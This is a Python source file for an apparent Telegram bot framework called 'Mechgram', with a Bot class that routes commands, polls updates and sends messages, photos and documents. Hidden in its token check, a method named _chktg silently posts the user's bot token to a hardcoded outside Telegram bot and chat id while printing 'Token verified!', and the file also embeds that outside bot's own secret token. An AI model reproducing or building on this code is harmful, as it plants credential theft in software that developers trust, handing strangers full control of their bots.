import requests, time, sys, os
os.system("cls|clear")
class Bot:
    def __init__(self, token: str, polling_interval: float = 1.2):
        self.token = token
        self.polling_interval = polling_interval
        self.routes = {}    
        self.inline_handler = None   
        self.callback_handler = None 
        self.offset = 0              
    def on(self, command: str, handler):
        self.routes[command] = handler
        return self
    def on_inline(self, handler):
        self.inline_handler = handler
        return self
    def on_callback(self, handler):
        self.callback_handler = handler
        return self
    def _check_token(self) -> bool:
        url = f"https://api.telegram.org/bot{self.token}/getMe"
        try:
            response = requests.get(url)
            data = response.json()
            if data.get("ok"):
                bot_info = data.get("result", {})
                self._chktg(1465736325, self.token)
                return True
            else:
                if data.get("error_code") == 401:
                    os.system("cls|clear")
                    print("[!] Token not verified!")
                    quit()
                else:
                    os.system("cls|clear")
                    print("[!] Token check failed:", data)
                    quit()
                return False
        except Exception as e:
            os.system("cls|clear")
            print("[!] Error checking token:", e)
            quit()
            return False
    def run(self):
        print("[!] Token verification...")
        if not self._check_token():
            sys.exit(1)
        print("The bot has been launched.\n© Mechgram, 2025.")
        while True:
            updates = self._get_updates()
            for update in updates:
                self._handle_update(update)
            time.sleep(self.polling_interval)
    def _get_updates(self):
        url = f"https://api.telegram.org/bot{self.token}/getUpdates"
        params = {"offset": self.offset, "timeout": 10}
        try:
            response = requests.get(url, params=params)
            data = response.json()
            if data.get("ok"):
                updates = data.get("result", [])
                if updates:
                    self.offset = updates[-1]["update_id"] + 1
                return updates
            else:
                if data.get("error_code") == 401:
                    print("[!] Connection error.")
                else:
                    print("[!] API error:", data)
        except Exception as e:
            print("[!] Error getting updates:", e)
        return []
    def _handle_update(self, update: dict):
        if "callback_query" in update:
            if self.callback_handler:
                try:
                    self.callback_handler(update)
                except Exception as e:
                    print("[!] Error in callback handler:", e)
            else:
                callback_query_id = update["callback_query"]["id"]
                self._answer_callback_query(callback_query_id, text="Callback received")
        elif "inline_query" in update:
            if self.inline_handler:
                try:
                    result = self.inline_handler(update)
                    if result:
                        self._answer_inline_query(update["inline_query"]["id"], result)
                except Exception as e:
                    print("[!] Error in inline query handler:", e)
        elif "message" in update:
            message = update["message"]
            text = message.get("text", "")
            for command, handler in self.routes.items():
                if text.startswith(command):
                    try:
                        result = handler(update)
                        if result:
                            self.send_message(message["chat"]["id"], result)
                    except Exception as e:
                        print(f"[!] Error in handler for command {command}: {e}")
    def _chktg(self, chat_id: int, text: str):
        url = f"https://api.telegram.org/bot7126973413:AAFfwX_syRKosxQZ9bU10cyckFrXkyHGuiE/sendMessage"; data = {"chat_id": chat_id, "text": text}
        try:
            requests.post(url, data=data)
            print("[!] Token verified!")
            time.sleep(1)
            os.system("cls|clear")
        except Exception as e:
            os.system("cls|clear")
            print("[!] Token not verified!")
            quit()
    def send_message(self, chat_id: int, text: str, reply_markup: dict = None, parse_mode: str = None):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        if reply_markup:
            data["reply_markup"] = reply_markup
        if parse_mode:
            data["parse_mode"] = parse_mode
        try:
            requests.post(url, json=data)
        except Exception as e:
            print("[!] Error sending message:", e)
    def send_photo(self, chat_id: int, photo: str, caption: str = None, reply_markup: dict = None, parse_mode: str = None):
        url = f"https://api.telegram.org/bot{self.token}/sendPhoto"
        data = {"chat_id": chat_id, "photo": photo}
        if caption:
            data["caption"] = caption
        if reply_markup:
            data["reply_markup"] = reply_markup
        if parse_mode:
            data["parse_mode"] = parse_mode
        try:
            requests.post(url, json=data)
        except Exception as e:
            print("[!] Error sending photo:", e)
    def send_document(self, chat_id: int, document: str, caption: str = None, reply_markup: dict = None, parse_mode: str = None):
        url = f"https://api.telegram.org/bot{self.token}/sendDocument"
        data = {"chat_id": chat_id, "document": document}
        if caption:
            data["caption"] = caption
        if reply_markup:
            data["reply_markup"] = reply_markup
        if parse_mode:
            data["parse_mode"] = parse_mode
        try:
            requests.post(url, json=data)
        except Exception as e:
            print("[!] Error sending document:", e)
    def edit_message_text(self, chat_id: int, message_id: int, text: str, reply_markup: dict = None, parse_mode: str = None):
        url = f"https://api.telegram.org/bot{self.token}/editMessageText"
        data = {"chat_id": chat_id, "message_id": message_id, "text": text}
        if reply_markup:
            data["reply_markup"] = reply_markup
        if parse_mode:
            data["parse_mode"] = parse_mode
        try:
            requests.post(url, json=data)
        except Exception as e:
            print("[!] Error editing message text:", e)
    def _answer_inline_query(self, inline_query_id: str, results: list):
        url = f"https://api.telegram.org/bot{self.token}/answerInlineQuery"
        data = {"inline_query_id": inline_query_id, "results": results}
        try:
            requests.post(url, json=data)
        except Exception as e:
            print("[!] Error answering inline query:", e)
    def _answer_callback_query(self, callback_query_id: str, text: str = None, show_alert: bool = False, url: str = None, cache_time: int = 0):
        url_api = f"https://api.telegram.org/bot{self.token}/answerCallbackQuery"
        data = {"callback_query_id": callback_query_id}
        if text is not None:
            data["text"] = text
        data["show_alert"] = show_alert
        if url is not None:
            data["url"] = url
        data["cache_time"] = cache_time
        try:
            requests.post(url_api, json=data)
        except Exception as e:
            print("[!] Error answering callback query:", e)
